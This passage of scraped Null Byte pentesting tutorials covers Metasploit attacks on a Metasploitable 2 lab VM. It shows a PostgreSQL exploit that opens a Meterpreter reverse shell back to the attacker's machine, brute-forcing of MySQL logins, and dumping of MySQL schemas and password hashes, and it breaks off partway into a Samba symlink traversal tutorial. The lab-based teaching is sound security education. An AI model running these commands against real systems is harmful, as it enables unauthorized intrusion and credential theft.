linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)\n21  linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager\n22  linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)\n23  linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)\n24  linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)\n25  linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager\n26  linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager\n27  linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager\n28  linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline (IPv6)\n29  linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline\n30  linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline\n31  linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline\n32  linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)\nLet's use the popular Meterpreter reverse shell; use the set command to set the payload:\nmsf5 exploit(linux/postgres/postgres_payload) > set payload linux/x86/meterpreter/reverse_tcp\npayload => linux/x86/meterpreter/reverse_tcp\nWe need to set the local host and local port options since this is a reverse shell. Set the lhost to the IP address of our local machine:\nmsf5 exploit(linux/postgres/postgres_payload) > set lhost 10.10.0.1\nlhost => 10.10.0.1\nAnd the lport to a port of your choosing:\nmsf5 exploit(linux/postgres/postgres_payload) > set lport 4321\nlport => 4321\nThat should be everything we need, so let's kick it off:\nmsf5 exploit(linux/postgres/postgres_payload) > run\n[*] Started reverse TCP handler on 10.10.0.1:4321\n[*] 10.10.0.50:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)\n[*] Uploaded as /tmp/FKXyvnhM.so, should be cleaned up automatically\n[*] Sending stage (985320 bytes) to 10.10.0.50\n[*] Meterpreter session 1 opened (10.10.0.1:4321 -> 10.10.0.50:37662) at 2020-05-10 12:18:23 -0600\nmeterpreter >\nWe can see it creates the handler, uploads the payload on the target, and finally, opens a session. We can now run commands like sysinfo to verify we have a shell on the target:\nmeterpreter > sysinfo\nComputer     : metasploitable.localdomain\nOS           : Ubuntu 8.04 (Linux 2.6.24-16-server)\nArchitecture : i686\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nWrapping Up\nToday we learned about PostgreSQL databases and how to gather information on them to aid in recon. First, we ran an Nmap scan to verify the service was open on the target. Next, we covered a variety of modules for collecting information, including version, login credentials, and password hashes. Finally, we used a module to exploit PostgreSQL, and ultimately obtained a Meterpreter session on the target.",
        "category": "Metasploit Basics"
    },
    {
        "title": "Enumerate MySQL Databases with Metasploit",
        "link": "https://null-byte.wonderhowto.com/how-to/enumerate-mysql-databases-with-metasploit-0203485/",
        "content": "* WonderHowTo\nIt's been said time and time again: reconnaissance is perhaps the most critical phase of an attack. It's especially important when preparing an attack against a database since one wrong move can destroy every last bit of data, which usually isn't the desired outcome. Metasploit contains a variety of modules that can be used to enumerate MySQL databases, making it easy to gather valuable information.\nWhat Information Is Valuable to an Attacker?\nTo a skilled hacker, almost any data can be important when it comes to preparing an attack. When we think of SQL from this perspective, a lot of times our minds go right to SQL injection, but gathering information about the database itself can sometimes be just as important.\n* Don't Miss: Use SQL Injection to Run OS Commands & Get a Shell\nThings to look for when enumerating a database include the version, as sometimes a successful attack can be as easy as finding an exploit for an outdated version. Other things to look for are valid credentials, which can not only be used for the database, but often can be used for other applications or systems (password reuse is a real thing, and a real problem for organizations). Lastly, information about the structure of the database can be extremely useful for performing SQL injection since knowing what's there is often half the battle.\nToday, we will be using Metasploit to enumerate some of this information on a MySQL database. We'll be attacking Metasploitable 2 via our Kali Linux box.\nStep 1: Perform the Nmap Scan\nThe first thing we need to do is determine if MySQL is running on the target. Since we know it runs on port 3306 by default, we can use Nmap to scan the host:\n~# nmap 10.10.0.50 -p 3306\nStarting Nmap 7.70 ( https://nmap.org ) at 2020-01-21 08:09 CDT\nNmap scan report for 10.10.0.50\nHost is up (0.00073s latency).\nPORT     STATE SERVICE\n3306/tcp open  mysql\nMAC Address: 00:1D:09:55:B1:3B (Dell)\nNmap done: 1 IP address (1 host up) scanned in 0.14 seconds\nAnd we can see, MySQL is indeed running and the port is open. Remember to use the correct IP address of the target.\nStep 2: Get the Login Info\nNow that we are certain MySQL is open on the target, we can get into enumeration to gather as much information as possible for reconnaissance. To begin, fire up Metasploit by typing msfconsole in the terminal.\n~# msfconsole\nWe can then search for any modules relating to MySQL by using the search command:\nmsf5 > search mysql\nMatching Modules\n================\n#   Name                                                  Disclosure Date  Rank       Check  Description\n-   ----                                                  ---------------  ----       -----  -----------\n0   auxiliary/admin/http/manageengine_pmp_privesc         2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection\n1   auxiliary/admin/http/rails_devise_pass_reset          2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset\n2   auxiliary/admin/mysql/mysql_enum                                       normal     No     MySQL Enumeration Module\n3   auxiliary/admin/mysql/mysql_sql                                        normal     No     MySQL SQL Generic Query\n4   auxiliary/admin/tikiwiki/tikidblib                    2006-11-01       normal     No     TikiWiki Information Disclosure\n5   auxiliary/analyze/jtr_mysql_fast                                       normal     No     John the Ripper MySQL Password Cracker (Fast Mode)\n6   auxiliary/gather/joomla_weblinks_sqli                 2014-03-02       normal     Yes    Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read\n7   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal     Yes    MySQL Authentication Bypass Password Dump\n8   auxiliary/scanner/mysql/mysql_file_enum                                normal     Yes    MYSQL File/Directory Enumerator\n9   auxiliary/scanner/mysql/mysql_hashdump                                 normal     Yes    MYSQL Password Hashdump\n10  auxiliary/scanner/mysql/mysql_login                                    normal     Yes    MySQL Login Utility\n11  auxiliary/scanner/mysql/mysql_schemadump                               normal     Yes    MYSQL Schema Dump\n12  auxiliary/scanner/mysql/mysql_version                                  normal     Yes    MySQL Server Version Enumeration\n13  auxiliary/scanner/mysql/mysql_writable_dirs                            normal     Yes    MYSQL Directory Write Test\n14  auxiliary/server/capture/mysql                                         normal     No     Authentication Capture: MySQL\n15  exploit/linux/mysql/mysql_yassl_getname               2010-01-25       good       No     MySQL yaSSL CertDecoder::GetName Buffer Overflow\n16  exploit/linux/mysql/mysql_yassl_hello                 2008-01-04       good       No     MySQL yaSSL SSL Hello Message Buffer Overflow\n17  exploit/multi/http/manage_engine_dc_pmp_sqli          2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection\n18  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE\n19  exploit/multi/mysql/mysql_udf_payload                 2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution\n20  exploit/unix/webapp/kimai_sqli                        2013-05-21       average    Yes    Kimai v0.9.2 'db_restore.php' SQL Injection\n21  exploit/unix/webapp/wp_google_document_embedder_exec  2013-01-03       normal     Yes    WordPress Plugin Google Document Embedder Arbitrary File Disclosure\n22  exploit/windows/mysql/mysql_mof                       2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution\n23  exploit/windows/mysql/mysql_start_up                  2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse\n24  exploit/windows/mysql/mysql_yassl_hello               2008-01-04       average    No     MySQL yaSSL SSL Hello Message Buffer Overflow\n25  exploit/windows/mysql/scrutinizer_upload_exec         2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential\n26  post/linux/gather/enum_configs                                         normal     No     Linux Gather Configurations\n27  post/linux/gather/enum_users_history                                   normal     No     Linux Gather User History\n28  post/multi/manage/dbvis_add_db_admin                                   normal     No     Multi Manage DbVisualizer Add Db Admin\nThere's a lot here, but mostly we are concerned with some of the auxiliary scanners for now. The first one we'll look at is the mysql_login module, which will find some valid credentials for the MySQL service. Load it up with the use command:\nmsf5 > use auxiliary/scanner/mysql/mysql_login\nNow, we can take a look at the current settings using the options command:\nmsf5 auxiliary(scanner/mysql/mysql_login) > options\nModule options (auxiliary/scanner/mysql/mysql_login):\nName              Current Setting  Required  Description\n----              ---------------  --------  -----------\nBLANK_PASSWORDS   false            no        Try blank passwords for all users\nBRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5\nDB_ALL_CREDS      false            no        Try each user/password couple stored in the current database\nDB_ALL_PASS       false            no        Add all passwords in the current database to the list\nDB_ALL_USERS      false            no        Add all users in the current database to the list\nPASSWORD                           no        A specific password to authenticate with\nPASS_FILE                          no        File containing passwords, one per line\nProxies                            no        A proxy chain of format type:host:port[,type:host:port][...]\nRHOSTS                             yes       The target address range or CIDR identifier\nRPORT             3306             yes       The target port (TCP)\nSTOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host\nTHREADS           1                yes       The number of concurrent threads\nUSERNAME                           no        A specific username to authenticate as\nUSERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line\nUSER_AS_PASS      false            no        Try the username as the password for all users\nUSER_FILE                          no        File containing usernames, one per line\nVERBOSE           true             yes       Whether to print output for all attempts\nFirst, let's create a text file containing a list of possible usernames. We'll keep it short for demonstration purposes, but longer, publicly available lists can also be used. We'll call it users.txt:\nmsf5 auxiliary(scanner/mysql/mysql_login) > nano users.txt\n[*] exec: nano users.txt\nNow let's add a few common potential usernames:\nSave the file, then we'll do the same thing for passwords:\nmsf5 auxiliary(scanner/mysql/mysql_login) > nano passwords.txt\n[*] exec: nano passwords.txt\nAgain, feel free to use longer password lists, but just know the module will take longer to complete. For now, we'll throw in a few common passwords:\nThen, we can set the file to read the usernames from:\nmsf5 auxiliary(scanner/mysql/mysql_login) > set user_file users.txt\nuser_file => users.txt\nAnd do the same for the passwords file:\nmsf5 auxiliary(scanner/mysql/mysql_login) > set pass_file passwords.txt\npass_file => passwords.txt\nMySQL can also allow logins with a blank password, so it's wise to check for that as well. Set the option to true to check for blank passwords:\nmsf5 auxiliary(scanner/mysql/mysql_login) > set blank_passwords true\nblank_passwords => true\nThe last thing we need to do is set the IP address of our target. We can use the setg command here to set the option globally since all of our scans will run on the same host:\nmsf5 auxiliary(scanner/mysql/mysql_login) > setg rhosts 10.10.0.50\nrhosts => 10.10.0.50\nFinally, type run to kick it off:\nmsf5 auxiliary(scanner/mysql/mysql_login) > run\n[+] 10.10.0.50:3306       - 10.10.0.50:3306 - Found remote MySQL version 5.0.51a\n[!] 10.10.0.50:3306       - No active DB -- Credential data will not be saved!\n[+] 10.10.0.50:3306       - 10.10.0.50:3306 - Success: 'root:'\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: admin: (Incorrect: Access denied for user 'admin'@'10.10.0.1' (using password: NO))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: admin:password (Incorrect: Access denied for user 'admin'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: admin:mysql (Incorrect: Access denied for user 'admin'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: admin:root (Incorrect: Access denied for user 'admin'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: admin:admin (Incorrect: Access denied for user 'admin'@'10.10.0.1' (using password: YES))\n[+] 10.10.0.50:3306       - 10.10.0.50:3306 - Success: 'guest:'\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: user: (Incorrect: Access denied for user 'user'@'10.10.0.1' (using password: NO))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: user:password (Incorrect: Access denied for user 'user'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: user:mysql (Incorrect: Access denied for user 'user'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: user:root (Incorrect: Access denied for user 'user'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: user:admin (Incorrect: Access denied for user 'user'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: mysql: (Incorrect: Access denied for user 'mysql'@'10.10.0.1' (using password: NO))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: mysql:password (Incorrect: Access denied for user 'mysql'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: mysql:mysql (Incorrect: Access denied for user 'mysql'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: mysql:root (Incorrect: Access denied for user 'mysql'@'10.10.0.1' (using password: YES))\n[-] 10.10.0.50:3306       - 10.10.0.50:3306 - LOGIN FAILED: mysql:admin (Incorrect: Access denied for user 'mysql'@'10.10.0.1' (using password: YES))\n[*] 10.10.0.50:3306       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nWe can see that it tries all the possible combinations of usernames and passwords we gave it, and it found a couple of valid logins in the process. It looks like both guest and root are valid logins using blank passwords, which will be good to know for the upcoming modules.\nStep 3: Run the MySQL Enumerator\nThe next module we'll look at will automatically enumerate various information about the MySQL database, including the version number, server information, data directory, and several other options that can be configured in MySQL.\nTo get started, load the mysql_enum module:\nmsf5 auxiliary(scanner/mysql/mysql_login) > use auxiliary/admin/mysql/mysql_enum\nNext, we can take a look at the options this module has to offer:\nmsf5 auxiliary(admin/mysql/mysql_enum) > options\nModule options (auxiliary/admin/mysql/mysql_enum):\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nPASSWORD                   no        The password for the specified username\nRHOSTS    10.10.0.50       yes       The target address range or CIDR identifier\nRPORT     3306             yes       The target port (TCP)\nUSERNAME                   no        The username to authenticate as\nThe port number is set by default, and since we previously used the global option to set the IP address, the only thing we need to set here is the username. We know from the previous step that this instance of MySQL allows root to login with a blank password, so we can set that option globally now:\nmsf5 auxiliary(admin/mysql/mysql_enum) > setg username root\nusername => root\nThe only thing left to do is to launch the module:\nmsf5 auxiliary(admin/mysql/mysql_enum) > run\n[*] Running module against 10.10.0.50\n[*] 10.10.0.50:3306 - Running MySQL Enumerator...\n[*] 10.10.0.50:3306 - Enumerating Parameters\n[*] 10.10.0.50:3306 -   MySQL Version: 5.0.51a-3ubuntu5\n[*] 10.10.0.50:3306 -   Compiled for the following OS: debian-linux-gnu\n[*] 10.10.0.50:3306 -   Architecture: i486\n[*] 10.10.0.50:3306 -   Server Hostname: metasploitable\n[*] 10.10.0.50:3306 -   Data Directory: /var/lib/mysql/\n[*] 10.10.0.50:3306 -   Logging of queries and logins: OFF\n[*] 10.10.0.50:3306 -   Old Password Hashing Algorithm OFF\n[*] 10.10.0.50:3306 -   Loading of local files: ON\n[*] 10.10.0.50:3306 -   Deny logins with old Pre-4.1 Passwords: OFF\n[*] 10.10.0.50:3306 -   Allow Use of symlinks for Database Files: YES\n[*] 10.10.0.50:3306 -   Allow Table Merge: YES\n[*] 10.10.0.50:3306 -   SSL Connections: Enabled\n[*] 10.10.0.50:3306 -   SSL CA Certificate: /etc/mysql/cacert.pem\n[*] 10.10.0.50:3306 -   SSL Key: /etc/mysql/server-key.pem\n[*] 10.10.0.50:3306 -   SSL Certificate: /etc/mysql/server-cert.pem\n[*] 10.10.0.50:3306 - Enumerating Accounts:\n[*] 10.10.0.50:3306 -   List of Accounts with Password Hashes:\n[+] 10.10.0.50:3306 -       User: debian-sys-maint Host:  Password Hash:\n[+] 10.10.0.50:3306 -       User: root Host: % Password Hash:\n[+] 10.10.0.50:3306 -       User: guest Host: % Password Hash:\n[*] 10.10.0.50:3306 -   The following users have GRANT Privilege:\n[*] 10.10.0.50:3306 -       User: debian-sys-maint Host:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following users have CREATE USER Privilege:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following users have RELOAD Privilege:\n[*] 10.10.0.50:3306 -       User: debian-sys-maint Host:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following users have SHUTDOWN Privilege:\n[*] 10.10.0.50:3306 -       User: debian-sys-maint Host:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following users have SUPER Privilege:\n[*] 10.10.0.50:3306 -       User: debian-sys-maint Host:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following users have FILE Privilege:\n[*] 10.10.0.50:3306 -       User: debian-sys-maint Host:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following users have PROCESS Privilege:\n[*] 10.10.0.50:3306 -       User: debian-sys-maint Host:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following accounts have privileges to the mysql database:\n[*] 10.10.0.50:3306 -       User: debian-sys-maint Host:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following accounts have empty passwords:\n[*] 10.10.0.50:3306 -       User: debian-sys-maint Host:\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -   The following accounts are not restricted by source:\n[*] 10.10.0.50:3306 -       User: guest Host: %\n[*] 10.10.0.50:3306 -       User: root Host: %\n[*] Auxiliary module execution completed\nWe can see it returns a bunch of information that could end up being extremely useful.\nStep 4: Dump the Database Schema\nThe next module we will use is the mysql_schemadump module, which, as the name implies, will dump the schema information about the database. A schema can be thought of as a sort of a blueprint for the database, containing organizational details on how it's laid out. It can be a lot of data to sift through, but it can help identify key pieces of the database in the recon phase.\nFirst, load the module:\nmsf5 auxiliary(admin/mysql/mysql_enum) > use auxiliary/scanner/mysql/mysql_schemadump\nAnd we can look at the options:\nmsf5 auxiliary(scanner/mysql/mysql_schemadump) > options\nModule options (auxiliary/scanner/mysql/mysql_schemadump):\nName             Current Setting  Required  Description\n----             ---------------  --------  -----------\nDISPLAY_RESULTS  true             yes       Display the Results to the Screen\nPASSWORD                          no        The password for the specified username\nRHOSTS           10.10.0.50       yes       The target address range or CIDR identifier\nRPORT            3306             yes       The target port (TCP)\nTHREADS          1                yes       The number of concurrent threads\nUSERNAME         root             no        The username to authenticate as\nEverything should be good to go here, so let's kick it off:\nmsf5 auxiliary(scanner/mysql/mysql_schemadump) > run\n[+] 10.10.0.50:3306       - Schema stored in: /root/.msf4/loot/20200121084427_default_10.10.0.50_mysql_schema_679633.txt\n[+] 10.10.0.50:3306       - MySQL Server Schema\nHost: 10.10.0.50\n====================\n- DBName: dvwa\n- TableName: guestbook\n- ColumnName: comment_id\nColumnType: smallint(5) unsigned\n- ColumnName: comment\nColumnType: varchar(300)\n- ColumnName: name\nColumnType: varchar(100)\n- TableName: users\n- ColumnName: user_id\nColumnType: int(6)\n- ColumnName: first_name\nColumnType: varchar(15)\n- ColumnName: last_name\nColumnType: varchar(15)\n- ColumnName: user\nColumnType: varchar(15)\n- ColumnName: password\nColumnType: varchar(32)\n- ColumnName: avatar\nColumnType: varchar(70)\n- DBName: metasploit\n- DBName: owasp10\n- TableName: accounts\n- ColumnName: cid\nColumnType: int(11)\n- ColumnName: username\nColumnType: text\n- ColumnName: password\nColumnType: text\n- ColumnName: mysignature\nColumnType: text\n- ColumnName: is_admin\nColumnType: varchar(5)\n- TableName: blogs_table\nAs previously stated, it will return a lot of information, but luckily, Metasploit saves the loot in a text file for more convenient viewing.\nStep 5: Get the MySQL Password Hashes\nThe next module we'll try out will attempt to gather any additional password hashes it finds in the database. It can be useful for pivoting to other systems, identifying password reuse, or gaining admin privileges if operating as another user.\nLoad the mysql_hashdump module:\nmsf5 auxiliary(scanner/mysql/mysql_schemadump) > use auxiliary/scanner/mysql/mysql_hashdump\nAnd take a peek at the options:\nmsf5 auxiliary(scanner/mysql/mysql_hashdump) > options\nModule options (auxiliary/scanner/mysql/mysql_hashdump):\nName      Current Setting  Required  Description\n----      ---------------  --------  -----------\nPASSWORD                   no        The password for the specified username\nRHOSTS    10.10.0.50       yes       The target address range or CIDR identifier\nRPORT     3306             yes       The target port (TCP)\nTHREADS   1                yes       The number of concurrent threads\nUSERNAME  root             no        The username to authenticate as\nAgain, it all looks good, so we can launch the module:\nmsf5 auxiliary(scanner/mysql/mysql_hashdump) > run\n[+] 10.10.0.50:3306       - Saving HashString as Loot: debian-sys-maint:\n[+] 10.10.0.50:3306       - Saving HashString as Loot: root:\n[+] 10.10.0.50:3306       - Saving HashString as Loot: guest:\n[*] 10.10.0.50:3306       - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nWe can see that it completes and saves any discovered hashes as loot. In this case, none of the users on the system have passwords set, so we don't get any strings.\nStep 6: Run SQL Queries\nThe last module we will look at today is the mysql_sql module, which can run SQL queries from within the Metasploit Framework. It does require a working knowledge of the SQL language, so at this point, it might be more efficient to just connect to the database directly to issue commands. However, this demonstrates how to do everything without having to leave Metasploit.\nFirst, load the module:\nmsf5 auxiliary(scanner/mysql/mysql_hashdump) > use auxiliary/admin/mysql/mysql_sql\nThen, we can view the current options:\nmsf5 auxiliary(admin/mysql/mysql_sql) > options\nModule options (auxiliary/admin/mysql/mysql_sql):\nName      Current Setting   Required  Description\n----      ---------------   --------  -----------\nPASSWORD                    no        The password for the specified username\nRHOSTS    10.10.0.50        yes       The target address range or CIDR identifier\nRPORT     3306              yes       The target port (TCP)\nSQL       select version()  yes       The SQL to execute.\nUSERNAME  root              no        The username to authenticate as\nThe only thing we need to set is the SQL query to run against the target. For instance, one of the first commands to get familiar with when connecting to a database is the show databases command. That will list all of the available databases to use.\nSet the option:\nmsf5 auxiliary(admin/mysql/mysql_sql) > set sql show databases\nsql => show databases\nAnd finally, run the module:\nmsf5 auxiliary(admin/mysql/mysql_sql) > run\n[*] Running module against 10.10.0.50\n[*] 10.10.0.50:3306 - Sending statement: 'show databases'...\n[*] 10.10.0.50:3306 -  | information_schema |\n[*] 10.10.0.50:3306 -  | dvwa |\n[*] 10.10.0.50:3306 -  | metasploit |\n[*] 10.10.0.50:3306 -  | mysql |\n[*] 10.10.0.50:3306 -  | owasp10 |\n[*] 10.10.0.50:3306 -  | tikiwiki |\n[*] 10.10.0.50:3306 -  | tikiwiki195 |\n[*] Auxiliary module execution completed\nWe can see there are a handful of different databases present in this instance of MySQL.\nWrapping Up\nToday, we explored some ways to collect valuable information about MySQL databases using Metasploit. We learned how to find credentials, schema information, password hashes, and other useful data that could be used to successfully attack the system. Bottom line: it pays to be prepared.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover image by geralt/Pixabay; Screenshots by drd_/Null Byte",
        "category": "Metasploit Basics"
    },
    {
        "title": "Get Root Filesystem Access via Samba Symlink Traversal",
        "link": "https://null-byte.wonderhowto.com/how-to/get-root-filesystem-access-via-samba-symlink-traversal-0198509/",
        "content": "* WonderHowTo\nSamba can be configured to allow any user with write access the ability to create a link to the root filesystem. Once an attacker has this level of access, it's only a matter of time before the system gets owned. Although this configuration isn't that common in the wild, it does happen, and Metasploit has a module to easily exploit this security flaw.\nSymbolic links, or symlinks, are files that link to other files or directories on a system, and they are an essential part of the Linux environment. Symlinks are often used to connect libraries and redirect certain binaries to other versions.\nFile share systems, like Samba, can take advantage of symbolic links, allowing users to easily access linked folders and files. But these links are normally confined to within the share itself, making it impossible to access the underlying filesystem.\n* Don't Miss: Get Root with Metasploit's Local Exploit Suggester\nSamba does have an option to use wide links, which are basically symlinks that are allowed to link outside of the sandboxed file share. This is obviously a huge security hole, as any user with write access to a share can create a link to the root filesystem.\nFor this demonstration, we will be using Kali Linux to attack a Metasploitable 2 virtual machine. If you have a similar pentesting lab you can follow along.\nStep 1: Create Link with Metasploit\nThe first thing we need to do after discovering that the SMB service is running on the target is to see if we can get access to the shares and, if so, find their names. We can use smbclient to do so:\n~# smbclient -L //10.10.0.50/\nEnter WORKGROUP\\root's password:\nAnonymous login successful\nSharename       Type      Comment\n---------       ----      -------\nprint$          Disk      Printer Drivers\ntmp             Disk      oh noes!\nopt             Disk\nIPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))\nADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))\nReconnecting with SMB1 for workgroup listing.\nAnonymous login successful\nServer               Comment\n---------            -------\nWorkgroup            Master\n---------            -------\nWORKGROUP            METASPLOITABLE\nAbove, we can see that we are able to log in anonymously and list the shares. It looks like there are a couple of default shares, but the one that looks interesting is labeled tmp. It even has a comment that looks suspicious, so we'll use this as our target share.\nNext, fire up Metasploit by typing msfconsole in the terminal.\n~# msfconsole\n[-] ***rting the Metasploit Framework console.../\n[-] * WARNING: No database support: No database YAML file\n.                                         .\ndBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o\n'   dB'                     BBP\ndB'dB'dB' dBBP     dBP     dBP BB\ndB'dB'dB' dBP      dBP     dBP  BB\ndB'dB'dB' dBBBBP   dBP     dBBBBBBB\ndBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP\n.                  .                  dB' dBP    dB'.BP\n|       dBP    dBBBB' dBP    dB'.BP dBP    dBP\n--o--    dBP    dBP    dBP    dB'.BP dBP    dBP\n|     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP\no                  To boldly go where no\nshell has gone before\n=[ metasploit v5.0.20-dev                          ]\n+ -- --=[ 1886 exploits - 1065 auxiliary - 328 post       ]\n+ -- --=[ 546 payloads - 44 encoders - 10 nops            ]\n+ -- --=[ 2 evasion                                       ]\nRecommended Reading: Metasploit Penetration Testing Cookbook, Third Edition\nOnce we're in and greeted by the login banner, we can search for a suitable module to use with the search command:\nmsf5 > search samba symlink\nMatching Modules\n================\n#   Name                                                 Disclosure Date  Rank       Check  Description\n-   ----                                                 ---------------  ----       -----  -----------\n0   auxiliary/admin/smb/samba_symlink_traversal                           normal     No     Samba Symlink Directory Traversal\n1   auxiliary/dos/samba/lsa_addprivs_heap                                 normal     No     Samba lsa_io_privilege_set Heap Overflow\n2   auxiliary/dos/samba/lsa_transnames_heap                               normal     No     Samba lsa_io_trans_names Heap Overflow\n3   auxiliary/dos/samba/read_nttrans_ea_list                              normal     No     Samba read_nttrans_ea_list Integer Overflow\n4   auxiliary/scanner/rsync/modules_list                                  normal     Yes    List Rsync Modules\n5   auxiliary/scanner/smb/smb_uninit_cred                                 normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State\n6   auxiliary/server/wget_symlink_file_write             2014-10-27       normal     No     GNU Wget FTP Symlink Arbitrary Filesystem Access\n7   exploit/freebsd/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (*BSD x86)\n8   exploit/linux/local/abrt_raceabrt_priv_esc           2015-04-14       excellent  Yes    ABRT raceabrt Privilege Escalation\n9   exploit/linux/local/asan_suid_executable_priv_esc    2016-02-17       excellent  Yes    AddressSanitizer (ASan) SUID Executable Privilege Escalation\n10  exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)\n11  exploit/linux/samba/is_known_pipename                2017-03-24       excellent  Yes    Samba is_known_pipename() Arbitrary Module Load\n12  exploit/linux/samba/lsa_transnames_heap              2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow\n13  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow\n14  exploit/linux/samba/trans2open                       2003-04-07       great      No     Samba trans2open Overflow (Linux x86)\n15  exploit/multi/samba/nttrans                          2003-04-07       average    No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow\n16  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba \"username map script\" Command Execution\n17  exploit/osx/samba/lsa_transnames_heap                2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow\n18  exploit/osx/samba/trans2open                         2003-04-07       great      No     Samba trans2open Overflow (Mac OS X PPC)\n19  exploit/solaris/samba/lsa_transnames_heap            2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow\n20  exploit/solaris/samba/trans2open                     2003-04-07       great      No     Samba trans2open Overflow (Solaris SPARC)\n21  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection\n22  exploit/unix/misc/distcc_exec                        2002-02-01       excellent  Yes    